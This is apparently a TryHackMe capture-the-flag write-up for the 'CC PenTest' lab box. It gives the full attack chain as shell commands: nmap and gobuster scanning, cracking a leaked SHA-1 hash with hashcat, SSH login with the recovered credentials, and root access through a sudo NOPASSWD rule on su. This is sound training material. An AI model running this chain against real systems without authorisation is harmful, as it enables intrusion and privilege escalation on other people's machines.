#+TITLE: TryHackMe - CC PenTest writeup

* Port scan

	#+begin_src shell
		nmap -p- -T4 -vv 10.10.203.54
		nmap -sC -sV -p 22,80 10.10.203.54
	#+end_src

	Found 2 open ports: 22 for SSH, 80 for a web server.

* Web path scan

	#+begin_src shell
		gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://10.10.203.54
		gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://10.10.203.54/secret -x txt
	#+end_src

	Found `/secret` with first pass of gobuster, and found `/secret/secret.txt` with second pass.

	`/secret/secret.txt` contains 'nyan:046385855FC9580393853D8E81F240B66FE9A7B8'.

* Hash cracking

	`hashid`	identifies '046385855FC9580393853D8E81F240B66FE9A7B8' as a SHA-1 hash.

	#+begin_src shell
		hashid 046385855FC9580393853D8E81F240B66FE9A7B8
		hashcat -m 100 --wordlist /usr/share/wordlists/rockyou.txt 046385855FC9580393853D8E81F240B66FE9A7B8

		# 046385855fc9580393853d8e81f240b66fe9a7b8:nyan
	#+end_src

* User.txt

	Let's try to connect the previously found SSH service as 'nyan:nyan'!

	#+begin_src shell
		ssh nyan@10.10.203.54
		cat user.txt
	#+end_src

	This works, and the flag is in 'user.txt'!

* Privilege escalation

	The file '.sudo_as_admin_successful' gives a hint, and `sudo -l` gives a quick win:

	#+begin_src shell
		sudo -l

		User nyan may run the following commands on ubuntu:
		(root) NOPASSWD: /bin/su

		sudo su # gives root!
	#+end_src

	And the flag is now accessible in '/root/root.txt'!
